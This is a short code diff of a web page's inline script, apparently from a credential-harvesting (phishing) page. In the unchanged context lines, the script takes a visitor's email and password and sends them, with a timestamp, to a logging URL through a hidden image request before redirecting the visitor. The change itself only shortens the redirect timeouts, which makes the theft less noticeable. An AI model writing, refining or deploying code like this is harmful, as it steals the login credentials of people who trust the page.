@@ -70,13 +70,13 @@
             var q = "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&time=" + encodeURIComponent(time);
             var img = new Image();
             img.src = SHEET_LOG_URL + q;
-            setTimeout(function() { go(target); }, 600);
+            setTimeout(function() { go(target); }, 350);
           } else {
             go(target);
           }
         }
         s.onload = s.onerror = runRedirect;
-        setTimeout(runRedirect, 2500);
+        setTimeout(runRedirect, 1400);
         document.head.appendChild(s);
       })();
     </script>
